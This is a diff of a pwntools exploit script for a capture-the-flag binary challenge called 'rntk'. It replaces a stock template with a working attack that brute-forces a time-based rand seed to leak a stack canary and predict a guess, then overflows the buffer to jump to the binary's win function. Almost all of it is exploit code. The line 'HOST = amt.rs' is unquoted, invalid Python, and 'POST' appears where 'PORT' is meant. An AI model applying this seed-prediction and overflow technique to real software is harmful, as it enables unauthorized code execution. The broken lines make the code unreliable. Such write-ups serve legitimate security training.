@@ -1,52 +1,44 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template rntk
 from pwn import *
+from ctypes import CDLL
+from ctypes.util import find_library
 
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF('rntk')
+file = ELF("../chal/chal")
+libc = CDLL(find_library("c"))
 
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
+HOST = amt.rs
+POST = 31175
 
+if args.HOST and args.PORT:
+    p = remote(args.HOST, args.PORT)
+else:
+    p = process("../chal/chal", cwd="../chal")
 
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
+time = libc.time(0)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = '''
-tbreak main
-continue
-'''.format(**locals())
+# generate 10 numbers to compare
+numbers = []
+for i in range(10):
+    p.sendlineafter(b"Exit\n", b"1")
+    numbers.append(int(p.readline()))
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    No canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
+# guess the random seed and get the canary
+for i in range(time-4096, time+4096):
+    libc.srand(i)
+    canary = libc.rand()
+    tmp = []
+    for _ in range(10):
+        tmp.append(libc.rand())
+    guess = libc.rand()
+    if tmp == numbers:
+        break
 
-io = start()
+print(f"[+] canary: {canary:x}")
 
-win_addr = p32(0x4012b6)
+attack = str(guess).encode().ljust(0x2c, b"\x00")
+attack += p32(canary)
+attack += p64(0)
+attack += p64(file.symbols["win"])
+p.sendline(b"2")
+p.sendline(attack)
 
-# Replace 44 with actual offset value.
-payload = b'A' * 44 + win_addr
-
-# Send payload
-io.sendlineafter('2) Try to guess a random number', '2') # select the option to guess the number
-io.sendlineafter('Enter in a number as your guess: ', payload) # send the payload
-
-io.interactive()
-
+p.interactive()
